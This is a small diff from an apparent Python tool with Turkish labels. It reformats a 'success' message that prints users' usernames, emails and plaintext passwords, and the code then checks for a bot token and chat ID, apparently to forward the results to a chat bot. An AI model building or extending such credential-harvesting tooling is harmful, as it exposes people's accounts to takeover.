@@ -55,7 +55,7 @@ def main():
                 email = user.get("email")
                 password = user.get("password")
 
-                msg = f"✅ KULLANICI AD : {username} \n\n EMAİL : {email} \n\n ŞİFRE : {password}"
+                msg = f"✅ BAŞARILI\n\nKULLANICI AD : {username}\n EMAİL : {email}\n ŞİFRE : {password}"
                 print(msg, flush=True)  # çıktıyı anında göster
 
                 if mode == 1 and BOT_TOKEN and CHAT_ID:
